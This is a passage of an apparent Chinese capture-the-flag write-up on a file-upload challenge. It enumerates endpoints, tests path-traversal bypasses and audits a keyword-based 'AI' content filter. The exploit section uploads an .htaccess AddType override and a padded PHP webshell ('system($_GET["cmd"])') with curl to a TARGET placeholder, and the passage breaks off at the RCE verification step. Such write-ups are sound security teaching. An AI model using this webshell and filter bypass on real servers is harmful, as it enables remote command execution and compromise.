+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="端点枚举-1"><span>端点枚举</span>
+  <a href="#%e7%ab%af%e7%82%b9%e6%9e%9a%e4%b8%be-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>首页 JS 及目录枚举发现以下端点：</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>端点</th>
+            <th>方法</th>
+            <th>功能</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>/</code></td>
+            <td>GET</td>
+            <td>主页，文件上传 UI</td>
+        </tr>
+        <tr>
+            <td><code>/upload.php</code></td>
+            <td>POST</td>
+            <td>文件上传处理</td>
+        </tr>
+        <tr>
+            <td><code>/analyze.php</code></td>
+            <td>POST</td>
+            <td>AI 内容分析，返回分析报告 JSON</td>
+        </tr>
+        <tr>
+            <td><code>/list.php</code></td>
+            <td>GET</td>
+            <td>返回已上传文件列表 JSON</td>
+        </tr>
+        <tr>
+            <td><code>/download.php?file=</code></td>
+            <td>GET</td>
+            <td>文件下载，过滤路径穿越</td>
+        </tr>
+        <tr>
+            <td><code>/config.php</code></td>
+            <td>GET</td>
+            <td>空响应，PHP 代码无输出</td>
+        </tr>
+        <tr>
+            <td><code>/submit.php</code></td>
+            <td>POST</td>
+            <td>提交三项证据换取 flag</td>
+        </tr>
+    </tbody>
+  </table>
+</div><p><code>/list.php</code> 初始返回一条记录：</p>
+<json-viewer value="&#34;{\&#34;files\&#34;:[{\&#34;name\&#34;:\&#34;analysis_report.pdf\&#34;,\&#34;path\&#34;:\&#34;analysis_report.pdf\&#34;,\&#34;size\&#34;:465}]}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p><code>/analyze.php</code> 返回固定分析模板，不依赖实际文件：</p>
+<json-viewer value="&#34;{\&#34;success\&#34;:true,\&#34;result\&#34;:\&#34;AI Deep Analysis Report\\n...\\nOverall Score: 9.2/10\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><h3 class="heading-element" id="上传防护测试"><span>上传防护测试</span>
+  <a href="#%e4%b8%8a%e4%bc%a0%e9%98%b2%e6%8a%a4%e6%b5%8b%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>逐层测试结果：</p>
+<p><strong>扩展名校验。</strong> <code>/upload.php</code> 对非白名单扩展名返回：</p>
+<json-viewer value="&#34;{\&#34;success\&#34;:false,\&#34;message\&#34;:\&#34;Unsupported file type. Only PDF, Word, and text files are allowed\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>上传扩展名</th>
+            <th>结果</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>.php</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.pht</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.phtml</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.php5</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.php7</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.phar</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.shtml</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.inc</code></td>
+            <td>Unsupported file type</td>
+        </tr>
+        <tr>
+            <td><code>.pdf</code></td>
+            <td>进入下一层检测</td>
+        </tr>
+        <tr>
+            <td><code>.docx</code></td>
+            <td>进入下一层检测</td>
+        </tr>
+        <tr>
+            <td><code>.txt</code></td>
+            <td>进入下一层检测</td>
+        </tr>
+    </tbody>
+  </table>
+</div><p><strong>MIME 类型检测。</strong> 上传 <code>.txt</code> 文件但包含 <code>&lt;?php</code> 代码时返回：</p>
+<json-viewer value="&#34;{\&#34;success\&#34;:false,\&#34;message\&#34;:\&#34;MIME type detection failed, file may have been tampered with\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>使用 <code>file</code> 命令或 PHP <code>finfo</code> 检测真实内容类型，PHP 代码使 MIME 偏离 <code>text/plain</code>。</p>
+<p><strong>AI 内容分析。</strong> 上传含 PHP 代码但未填充的文件时返回：</p>
+<json-viewer value="&#34;{\&#34;success\&#34;:false,\&#34;message\&#34;:\&#34;AI detected malicious content in the first 1KB of the file\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>通过此错误信息确认 AI 检测窗口为前 1024 字节。上传 1024+ 字节纯 &lsquo;A&rsquo; 填充 + PHP 代码的文件通过三层防护。</p>
+<h3 class="heading-element" id="downloadphp-路径穿越测试"><span>download.php 路径穿越测试</span>
+  <a href="#downloadphp-%e8%b7%af%e5%be%84%e7%a9%bf%e8%b6%8a%e6%b5%8b%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>测试过的绕过方式（全部返回 <code>Invalid file path</code> 或 <code>File not found</code>）：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">....//index.php          → Invalid file path   (非递归strip不适用)
+</span></span><span class="line"><span class="cl">..%2findex.php           → Invalid file path   (URL编码被检测)
+</span></span><span class="line"><span class="cl">..%252findex.php         → Invalid file path   (双编码被检测)
+</span></span><span class="line"><span class="cl">..\/index.php            → Invalid file path   (反斜杠被检测)
+</span></span><span class="line"><span class="cl">..%5c/index.php          → Invalid file path   (编码反斜杠被检测)
+</span></span><span class="line"><span class="cl">%c0%ae%c0%ae/index.php   → File not found      (UTF-8过过滤但路径无效)
+</span></span><span class="line"><span class="cl">/etc/passwd%00           → PHP Warning         (null byte触发warning但未读文件)
+</span></span><span class="line"><span class="cl">php://filter/...         → File not found      (file_exists不支持wrapper)
+</span></span><span class="line"><span class="cl">../config.php            → Invalid file path   (strpos位置0严格比较)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h2 class="heading-element" id="源码审计-1"><span>源码审计</span>
+  <a href="#%e6%ba%90%e7%a0%81%e5%ae%a1%e8%ae%a1-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="check_extension--扩展名校验"><span>check_extension() — 扩展名校验</span>
+  <a href="#check_extension--%e6%89%a9%e5%b1%95%e5%90%8d%e6%a0%a1%e9%aa%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_extension</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">===</span> <span class="s1">&#39;.htaccess&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nx">ALLOWED_EXTENSIONS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>.htaccess</code> 在扩展名检测函数中被显式返回 <code>true</code>，不经过 <code>ALLOWED_EXTENSIONS</code> 白名单检查。</p>
+<h3 class="heading-element" id="ai_security_check--ai-内容检测"><span>ai_security_check() — AI 内容检测</span>
+  <a href="#ai_security_check--ai-%e5%86%85%e5%ae%b9%e6%a3%80%e6%b5%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">ai_security_check</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$handle</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$header</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$dangerous_keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&lt;?php&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;?=&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dangerous_keywords</span> <span class="k">as</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>约束：</p>
+<ul>
+<li>扫描窗口仅文件前 1024 字节</li>
+<li>仅检查 5 个关键词（<code>&lt;?php</code>, <code>&lt;?=</code>, <code>eval</code>, <code>system</code>, <code>exec</code>）</li>
+<li>大小写不敏感匹配（<code>stripos</code>）</li>
+<li>不检查编码变形、字符串拼接、异或编码</li>
+</ul>
+<h3 class="heading-element" id="downloadphp--文件下载"><span>download.php — 文件下载</span>
+  <a href="#downloadphp--%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filepath</span> <span class="o">=</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid file path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not found&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><ul>
+<li><code>strpos</code> 使用 <code>!== false</code> 严格比较</li>
+<li><code>file_exists()</code> 检查拼接 <code>UPLOAD_DIR</code> 前缀后的完整路径</li>
+<li><code>readfile()</code> 输出文件内容，不支持 PHP stream wrapper</li>
+</ul>
+<h3 class="heading-element" id="apache-配置"><span>Apache 配置</span>
+  <a href="#apache-%e9%85%8d%e7%bd%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>uploads 目录开启 <code>AllowOverride All</code>，允许 <code>.htaccess</code> 覆写配置。</p>
+<h2 class="heading-element" id="上传绕过"><span>上传绕过</span>
+  <a href="#%e4%b8%8a%e4%bc%a0%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="htaccess-上传"><span>.htaccess 上传</span>
+  <a href="#htaccess-%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>.htaccess</code> 内容为 <code>AddType application/x-httpd-php .txt</code>，不含任何危险关键词，AI 检测直接通过：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;AddType application/x-httpd-php .txt&#34;</span> &gt; .htaccess
+</span></span><span class="line"><span class="cl">curl -X POST -F <span class="s2">&#34;file=@.htaccess;filename=.htaccess&#34;</span> http://TARGET/upload.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>服务端返回：</p>
+<json-viewer value="&#34;{\&#34;success\&#34;:true,\&#34;message\&#34;:\&#34;AI analysis complete: document content is safe, uploaded successfully\&#34;,\&#34;filename\&#34;:\&#34;.htaccess\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>uploads 目录 <code>AllowOverride All</code> 使 <code>.htaccess</code> 中的 <code>AddType</code> 指令生效，该目录下所有 <code>.txt</code> 文件按 <code>application/x-httpd-php</code> MIME 处理。</p>
+<h3 class="heading-element" id="webshell-上传"><span>webshell 上传</span>
+  <a href="#webshell-%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>前 1025 字节用 <code>#</code> 填充，将 <code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code> 置于 AI 扫描窗口之外：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;#%.0s&#39;</span> <span class="o">{</span>1..1025<span class="o">}</span> &gt; s.php.txt
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt;&gt; s.php.txt
+</span></span><span class="line"><span class="cl">curl -X POST -F <span class="s2">&#34;file=@s.php.txt&#34;</span> http://TARGET/upload.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>三层检测均通过：</p>
+<ul>
+<li>扩展名 <code>.txt</code> 在白名单</li>
+<li>1025 字节 ASCII 字符 <code>#</code> 使 MIME 识别为 <code>text/plain</code></li>
+<li><code>&lt;?php</code> 和 <code>system</code> 关键词在 1024 字节之后，AI 未扫描到</li>
+</ul>
+<h3 class="heading-element" id="rce-验证"><span>RCE 验证</span>
+  <a href="#rce-%e9%aa%8c%e8%af%81" class="heading-mark">
